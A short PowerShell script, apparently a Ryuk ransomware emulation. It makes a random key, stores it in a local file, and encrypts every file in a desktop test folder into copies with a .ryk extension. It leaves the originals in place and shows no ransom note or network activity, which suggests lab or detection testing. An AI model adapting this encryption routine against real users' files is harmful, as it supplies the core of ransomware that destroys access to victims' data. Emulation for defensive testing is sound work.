$KeyFile = 'c:\temp\Super_Key.key'
$EncFolder = "$env:userprofile\Desktop\ryuk\ryuk_target_files_encryption"
$DecFolder = "$env:userprofile\Desktop\ryuk\ryuk_target_files"

# Ensure the Encrypted and Decrypted folders exist
New-Item -ItemType Directory -Path $EncFolder -Force | Out-Null

##### Generate a password
$Bytes = [byte[]]::new(1024)
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($Bytes)
$SpecialChars = @(40,41,33,64,36,37,45,61,46,63,42,59,38) 
$Filter = {
    ($_ -ge 97 -and $_ -le 122) -or  # a - z
    ($_ -ge 65 -and $_ -le 90)  -or  # A - Z
    ($_ -ge 50 -and $_ -le 57)  -or  # 2 - 9
    ($SpecialChars -contains $_)     # ()!@$%-=.?*;&
}
$text  = [Text.Encoding]::ASCII.GetString(($Bytes | where $Filter))
$pass  = $text.Substring(0,128)


# Create a key by hashing the password 
$algo  = [System.Security.Cryptography.HashAlgorithm]::Create('SHA256')
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pass)
$StrB  = [System.Text.StringBuilder]::new()
$algo.ComputeHash($bytes) | foreach {[void]$StrB.Append($_.ToString('x2'))}
$Key   = $StrB.ToString(0,32) | Out-File $KeyFile -Encoding utf8 -NoNewline


##### Encrypt the Files in the Folder
$key    = [byte[]][char[]](Get-Content $KeyFile -Raw)
$FilesToEncrypt = Get-ChildItem $DecFolder
foreach ($file in $FilesToEncrypt) {
    $Text   = Get-Content $file.FullName -Raw
    $SecStr = ConvertTo-SecureString -String $Text -AsPlainText -Force
    $EncStr = $SecStr | ConvertFrom-SecureString -Key $Key  # <-- encryption
    $EncStr | Out-File "$EncFolder\$($file.Name).ryk" -Encoding utf8 -NoNewline
}

Write-Host "Encryption completed."